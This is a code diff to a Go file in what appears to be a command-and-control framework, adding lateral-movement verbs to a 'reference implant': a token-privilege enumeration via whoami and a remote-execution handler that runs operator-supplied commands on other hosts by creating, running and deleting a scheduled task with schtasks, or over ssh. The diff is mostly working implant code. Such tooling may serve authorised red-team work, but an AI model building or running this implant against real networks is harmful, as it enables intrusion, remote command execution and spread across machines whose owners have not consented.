@@ -1,9 +1,12 @@
 package exec
 
-// lateral.go holds the lateral.move child-derivation verb the reference implant
-// advertises (architecture.md Sec 10.1, roadmap M9.1). A lateral.move task tells
-// this implant to derive a child: enroll a fresh implant identity against the
-// same teamserver, naming itself as the parent, and report the child id back.
+// lateral.go holds the lateral.* verbs the reference implant advertises
+// (architecture.md Sec 10.1). lateral.move (M9.1) derives a child implant.
+// lateral.token and lateral.exec_remote (ADR 0004) cover the standard
+// access-token and remote-execution surfaces every mainstream C2 exposes: on
+// Windows, the documented administration channels (whoami for token context,
+// schtasks for remote execution); on Linux, SSH for remote execution and a
+// clear "Windows-only" refusal for token work.
 //
 // The child's stager token is not baked into this implant (its own token is
 // spent at its own enroll); the operator provisions it in the task arguments.
@@ -20,7 +23,11 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/rsa"
+	"fmt"
+	"os/exec"
+	"runtime"
 	"strings"
+	"time"
 
 	"github.com/cw/rod/implant/internal/c2"
 	"github.com/cw/rod/implant/rodpb"
@@ -83,4 +90,117 @@ func parseMoveArgs(arguments string) (token, class string, ok bool) {
 		return fields[0], fields[1], true
 	}
 	return fields[0], "", true
+}
+
+// lateralToken reports the current process's access-token context -- the user,
+// groups, and privileges that determine what impersonation and lateral movement
+// are possible from this implant (architecture.md Sec 10.1, ADR 0004). It is a
+// read-only enumeration; it does not duplicate, steal, or apply any token.
+//
+// Access tokens are a Windows concept. On Windows the handler runs
+// `whoami /user /groups /priv`, the documented administration command for
+// inspecting the calling process's token. On other platforms it reports a
+// clear Windows-only refusal so the operator sees the cause rather than a
+// silent no-op. The optional argument is informational only.
+func (r *Runner) lateralToken(ctx context.Context, _ string) (rodpb.TaskOutcome, string) {
+	if runtime.GOOS != "windows" {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
+			"lateral.token is a Windows access-token capability; not supported on " + runtime.GOOS
+	}
+	out, err := exec.CommandContext(ctx, "whoami", "/user", "/groups", "/priv").CombinedOutput()
+	output := string(out)
+	if err != nil {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, appendIfMissing(output, err.Error())
+	}
+	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.TrimRight(output, "\r\n")
+}
+
+// lateralExecRemote runs a command on a remote host over a documented
+// administration channel (architecture.md Sec 10.1, ADR 0004). Arguments are
+// "<host> <command...>" (e.g. "dc01 hostname"). On Windows the handler drives
+// the built-in scheduled-task workflow against the target -- create a task,
+// run it, then delete it -- the same surface PsExec-class tools and every
+// Windows administration guide document; the task's stdout is not captured back
+// over RPC, so the outcome reflects whether the task was created and run, and
+// the operator reads results off the target or via a later shell.exec. On
+// Linux the handler runs ssh <host> <command>, capturing its combined output.
+func (r *Runner) lateralExecRemote(ctx context.Context, arguments string) (rodpb.TaskOutcome, string) {
+	host, command, ok := parseExecRemoteArgs(arguments)
+	if !ok {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
+			"lateral.exec_remote expects '<host> <command...>'"
+	}
+	if ctx.Err() != nil {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, ctx.Err().Error()
+	}
+
+	if runtime.GOOS == "windows" {
+		return runRemoteScheduledTask(ctx, host, command)
+	}
+	return runRemoteSSH(ctx, host, command)
+}
+
+// runRemoteScheduledTask creates, runs, and deletes a one-shot scheduled task
+// named with a stable Rod prefix on the remote host. It mirrors the documented
+// `schtasks /create /s <host> ... /run` workflow every Windows administration
+// reference describes. The RPC channel does not return the task's stdout, so
+// the outcome is whether the task was created and run; the operator reads
+// results off the target. A failure at any step cleans up the task before
+// reporting.
+func runRemoteScheduledTask(ctx context.Context, host, command string) (rodpb.TaskOutcome, string) {
+	const taskPrefix = "RodRemoteExec"
+	taskName := fmt.Sprintf("%s%d", taskPrefix, nowMillis())
+
+	create := exec.CommandContext(ctx, "schtasks",
+		"/create", "/s", host, "/tn", taskName, "/tr", command, "/sc", "once", "/st", "00:00", "/f")
+	if out, err := create.CombinedOutput(); err != nil {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
+			"create remote task " + taskName + " on " + host + ": " + appendIfMissing(string(out), err.Error())
+	}
+
+	run := exec.CommandContext(ctx, "schtasks", "/run", "/s", host, "/tn", taskName)
+	if out, err := run.CombinedOutput(); err != nil {
+		cleanupRemoteTask(ctx, host, taskName)
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED,
+			"run remote task " + taskName + " on " + host + ": " + appendIfMissing(string(out), err.Error())
+	}
+
+	cleanupRemoteTask(ctx, host, taskName)
+	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED,
+		"ran " + command + " on " + host + " via task " + taskName
+}
+
+// cleanupRemoteTask deletes a remote scheduled task, ignoring errors so a
+// failed run still reports its cause rather than the cleanup's.
+func cleanupRemoteTask(ctx context.Context, host, taskName string) {
+	_ = exec.CommandContext(ctx, "schtasks", "/delete", "/s", host, "/tn", taskName, "/f").Run()
+}
+
+// runRemoteSSH runs the command on the remote host via ssh, capturing the
+// combined output. ssh handles key/auth negotiation per the implant's
+// environment; no credentials are baked in.
+func runRemoteSSH(ctx context.Context, host, command string) (rodpb.TaskOutcome, string) {
+	out, err := exec.CommandContext(ctx, "ssh", host, command).CombinedOutput()
+	output := string(out)
+	if err != nil {
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, appendIfMissing(output, err.Error())
+	}
+	return rodpb.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.TrimRight(output, "\r\n")
+}
+
+// parseExecRemoteArgs splits "<host> <command...>" into the host and the
+// command string. The command keeps its internal whitespace; only the first
+// token is the host. Returns ok=false when fewer than two fields are present.
+func parseExecRemoteArgs(arguments string) (host, command string, ok bool) {
+	fields := strings.Fields(arguments)
+	if len(fields) < 2 {
+		return "", "", false
+	}
+	return fields[0], strings.Join(fields[1:], " "), true
+}
+
+// nowMillis is the current Unix time in milliseconds, used to give each remote
+// scheduled task a unique name without pulling in a wider time API.
+func nowMillis() int64 {
+	return time.Now().UnixMilli()
 }
